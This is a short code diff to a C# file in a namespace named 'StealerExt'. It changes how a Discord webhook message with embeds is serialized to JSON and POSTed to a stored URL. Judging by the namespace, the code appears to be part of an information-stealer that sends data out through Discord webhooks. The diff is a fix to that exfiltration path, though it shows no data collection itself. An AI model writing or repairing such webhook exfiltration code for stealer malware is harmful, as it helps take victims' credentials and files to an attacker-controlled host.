@@ -1,4 +1,7 @@
-﻿using System.Collections.Generic;
+﻿using Newtonsoft.Json;
+using System.Collections.Generic;
+using System.Net.Http;
+using System.Text;
 using System.Threading.Tasks;
 
 namespace StealerExt
@@ -38,7 +41,8 @@ namespace StealerExt
                 avatar_url = WebhookAvatarUrl,
                 embeds = DiscordEmbeds
             };
-            await new HttpUtils().PostAsync(_url, newEmbed);
+            var jsonBody = new StringContent(JsonConvert.SerializeObject(newEmbed), Encoding.UTF8, "application/json");
+            await new HttpUtils().PostAsync(_url, jsonBody);
         }
     }
 }
